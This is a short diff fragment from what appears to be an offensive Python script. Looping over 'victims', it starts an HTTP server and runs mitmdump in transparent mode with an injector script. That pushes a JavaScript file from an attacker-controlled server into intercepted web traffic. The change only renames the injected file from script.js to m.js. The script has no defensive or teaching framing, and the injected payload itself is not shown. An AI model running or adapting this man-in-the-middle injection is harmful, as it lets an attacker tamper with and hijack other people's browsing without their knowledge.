@@ -25,7 +25,7 @@ for victim in victims:
 os.system("xterm -hold -e 'python3 httpServer.py' &")
 
 # start the mitmproxy
-os.system("/usr/bin/mitmdump -s injector.py 'http://httpservice:8000/script.js' --mode transparent")
+os.system("/usr/bin/mitmdump -s injector.py 'http://httpservice:8000/m.js' --mode transparent")
 
 
 '''
